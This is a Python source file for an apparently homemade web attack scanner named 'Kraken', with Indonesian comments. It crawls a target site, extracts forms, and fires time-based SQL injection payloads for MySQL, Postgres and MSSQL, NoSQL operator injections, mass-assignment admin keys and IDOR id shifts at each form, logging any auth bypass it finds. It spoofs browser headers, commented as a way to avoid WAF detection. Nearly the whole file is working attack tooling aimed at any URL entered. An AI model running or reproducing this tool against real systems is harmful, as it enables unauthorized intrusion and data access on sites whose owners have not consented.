import asyncio, aiohttp, time, random, re, hashlib, json, logging, copy, difflib
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from aiohttp import ClientSession, CookieJar, TCPConnector

# === MODULE 1: ADVANCED CONFIG & SPOOFING ===
class CoreConfig:
    THREADS = 5
    MAX_DEPTH = 3
    TIMEOUT = 15
    MAX_REDIRECTS = 3
    SIMILARITY_THRESHOLD = 0.92
    
    # [FIX 1] BROWSER SPOOFING (Anti-WAF Fingerprinting)
    # WAF nggak bakal gampang curiga karena header ini persis kayak Chrome asli
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1'
    }
    
    # [FIX 2] EXPANDED PAYLOADS
    PAYLOADS = {
        'MYSQL': ["' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "' UNION SELECT 1,2,SLEEP(5)--", "1' ORDER BY 1--"],
        'POSTGRES': ["' OR pg_sleep(5)--", "'; SELECT pg_sleep(5)--", "1' AND 1=CAST((SELECT version()) AS int)--"],
        'MSSQL': ["'; WAITFOR DELAY '0:0:5'--", "') OR 1=1;--", "' HAVING 1=1--"],
        'NOSQL': ['{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}']
    }

logging.basicConfig(level=logging.INFO, format='\033[96m[KRAKEN]\033[0m %(message)s')
logger = logging.getLogger("Phantom")

# === MODULE 2: SEMANTIC LOGIC CHAINER ===
class SemanticLogicChainer:
    def __init__(self):
        self.god_keys = {"isAdmin": True, "role": "admin", "permissions": 999, "debug": True}
        
    def warp_reality(self, original_params, is_json=False):
        mutated_payloads = []
        if is_json:
            p_priv = copy.deepcopy(original_params)
            p_priv.update(self.god_keys)
            mutated_payloads.append(("Mass-Assignment", p_priv))

        for key, val in original_params.items():
            # [FIX 3] CSRF PRESERVATION
            # Jangan fuzzer token CSRF/session, biarkan original agar request tidak di-drop server
            if any(k in key.lower() for k in ['csrf', 'token', 'nonce', '_csrf', 'auth']):
                continue

            val_str = val[0] if isinstance(val, list) else str(val)
            
            if is_json:
                p_type = copy.deepcopy(original_params)
                p_type[key] = {"$ne": "impossible"} 
                mutated_payloads.append(("Type-Confusion", p_type))
                
                p_arr = copy.deepcopy(original_params)
                p_arr[key] = [val] 
                mutated_payloads.append(("Array-Pollution", p_arr))

            if val_str.lstrip('-').isdigit():
                p_neg = copy.deepcopy(original_params)
                p_neg[key] = -1
                mutated_payloads.append(("Negative-Logic", p_neg))
                
                p_idor = copy.deepcopy(original_params)
                p_idor[key] = int(val_str) + 1
                mutated_payloads.append(("IDOR-Shift", p_idor))

        return mutated_payloads

# === MODULE 3: THE KRAKEN ENGINE ===
class KrakenV33:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.visited = set()
        self.visited_patterns = set()
        self.endpoints = {}
        self.queue = asyncio.Queue()
        self.results = []
        self.warper = SemanticLogicChainer()

    def calculate_similarity(self, html1, html2):
        def clean(h): return re.sub(r'(token|ts|time|csrf|nonce|id)["\']\s*[:=]\s*["\'][^"\']+["\']', '', h, flags=re.I)
        return difflib.SequenceMatcher(None, clean(html1), clean(html2)).ratio()

    async def fetch(self, session, method, url, **kwargs):
        kwargs.setdefault('ssl', False)
        # Terapkan Browser Headers Spoofing
        kwargs.setdefault('headers', CoreConfig.HEADERS)
        kwargs.setdefault('allow_redirects', True)
        kwargs.setdefault('max_redirects', CoreConfig.MAX_REDIRECTS)
        
        for attempt in range(3):
            try:
                start = time.time()
                async with session.request(method, url, timeout=CoreConfig.TIMEOUT, **kwargs) as r:
                    if r.status == 429:
                        wait = random.randint(10, 25)
                        logger.warning(f"⏳ Rate Limit (429) at {url}. Backing off for {wait}s...")
                        await asyncio.sleep(wait)
                        continue
                    return {'text': await r.text(), 'status': r.status, 'time': time.time() - start, 'content_type': r.headers.get('Content-Type', '').lower()}
            except aiohttp.TooManyRedirects:
                return None
            except Exception:
                if attempt == 2: return None
                await asyncio.sleep(2)
        return None

    async def crawler_worker(self, session):
        while True:
            item = await self.queue.get()
            if item is None: break
            url, depth = item

            parsed = urlparse(url)
            param_keys = tuple(sorted(parse_qs(parsed.query).keys()))
            url_pattern = f"{parsed.path}?{param_keys}"

            if url in self.visited or url_pattern in self.visited_patterns or depth > CoreConfig.MAX_DEPTH:
                self.queue.task_done()
                continue
            
            self.visited.add(url)
            self.visited_patterns.add(url_pattern)
            logger.info(f"🔍 Crawling: {url}")
            
            res = await self.fetch(session, "GET", url)
            if not res or res['status'] != 200:
                self.queue.task_done()
                continue

            soup = BeautifulSoup(res['text'], 'html.parser')
            
            # [FIX 4] ADVANCED FORM PARSER (Select, Button, CSRF Extraction)
            for f in soup.find_all('form'):
                action = urljoin(url, f.get('action', ''))
                meth = f.get('method', 'GET').upper()
                
                inputs = {}
                for i in f.find_all(['input', 'textarea', 'select', 'button']):
                    name = i.get('name')
                    if not name: continue
                    value = i.get('value', 'test')
                    # Tangani elemen select
                    if i.name == 'select':
                        opt = i.find('option')
                        if opt: value = opt.get('value', '1')
                    inputs[name] = value

                if not inputs: continue
                
                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in inputs.items()}
                
                # Identifikasi apakah ini JSON API berdasarkan Content-Type (Fix Auditor)
                enc_type = f.get('enctype', '').lower()
                is_json = 'application/json' in enc_type
                
                eid = hashlib.md5(f"{meth}{action}{sorted(flat_params.keys())}".encode()).hexdigest()
                if eid not in self.endpoints:
                    self.endpoints[eid] = {'url': action, 'meth': meth, 'params': flat_params, 'base': res, 'is_json': is_json}

            # Link Discovery
            for a in soup.find_all('a', href=True):
                full = urljoin(url, a['href'])
                if self.domain in full:
                    await self.queue.put((full, depth + 1))
            
            self.queue.task_done()

    async def audit_endpoint(self, session, ep):
        url, meth, params, base, is_json_form = ep['url'], ep['meth'], ep['params'], ep['base'], ep.get('is_json', False)
        
        # [FIX 5] SMART JSON DETECTION
        # Mengecek apakah endpoint ini benar-benar mengharapkan JSON dari history Content-Type
        is_json = is_json_form or ('application/json' in base.get('content_type', ''))
        
        # --- FASE 1: SYNTAX (SQLi / DAST) ---
        for key, val in params.items():
            # Lindungi Token Anti-CSRF dari Fuzzing (Fix Auditor)
            if any(k in key.lower() for k in ['csrf', 'token', 'nonce']):
                continue

            for db, payloads in CoreConfig.PAYLOADS.items():
                for p in payloads:
                    t_params = copy.deepcopy(params)
                    t_params[key] = f"{val}{p}"
                    
                    req_kwargs = {'json': t_params} if is_json and meth == 'POST' else {'data': t_params} if meth == 'POST' else {'params': t_params}
                    attack = await self.fetch(session, meth, url, **req_kwargs)
                    if not attack: continue

                    if attack['time'] > (base['time'] + 4.5):
                        logger.critical(f"💥 TIME-BASED SYNTAX ({db}): {url} -> {key}")
                        self.results.append({'url': url, 'type': f'Syntax-{db}', 'param': key, 'payload': p})
                        return 

        # --- FASE 2: SEMANTIC (LOGIC / IDOR) ---
        logic_attacks = self.warper.warp_reality(params, is_json=(is_json and meth == 'POST'))
        
        for attack_name, mutated_params in logic_attacks:
            req_kwargs = {'json': mutated_params} if is_json and meth == 'POST' else {'data': mutated_params} if meth == 'POST' else {'params': mutated_params}
            logic_res = await self.fetch(session, meth, url, **req_kwargs)
            if not logic_res: continue

            sim = self.calculate_similarity(base['text'], logic_res['text'])
            
            if logic_res['status'] == 200 and base['status'] in [401, 403]:
                logger.critical(f"🎭 AUTH BYPASS ({attack_name}): {url}")
                self.results.append({'url': url, 'type': f'LogicBypass-{attack_name}', 'payload': mutated_params})
            
            elif logic_res['status'] == 200 and sim < CoreConfig.SIMILARITY_THRESHOLD:
                logger.warning(f"⚠️  SEMANTIC ANOMALY ({attack_name}): {url}")
                self.results.append({'url': url, 'type': f'LogicAnomaly-{attack_name}', 'payload': mutated_params})

    async def run(self):
        connector = TCPConnector(limit=CoreConfig.THREADS)
        async with ClientSession(connector=connector, cookie_jar=CookieJar(unsafe=True)) as session:
            await self.queue.put((self.target, 1))
            workers = [asyncio.create_task(self.crawler_worker(session)) for _ in range(CoreConfig.THREADS)]
            
            await self.queue.join()
            for _ in range(CoreConfig.THREADS): await self.queue.put(None)
            await asyncio.gather(*workers)

            logger.info(f"✅ Recon complete. Found {len(self.endpoints)} endpoints.")
            if self.endpoints:
                await asyncio.gather(*[self.audit_endpoint(session, e) for e in self.endpoints.values()])
            
            with open("kraken_phantom_report.json", "w") as f:
                json.dump(self.results, f, indent=4)
            logger.info(f"🏁 Audit Complete. Report saved to kraken_phantom_report.json")

if __name__ == "__main__":
    target = input("Enter Target API/Web (e.g., http://localhost/api): ")
    if target.startswith("http"):
        asyncio.run(KrakenV33(target).run())
    else:
        print("Invalid URL format. Please include http:// or https://")
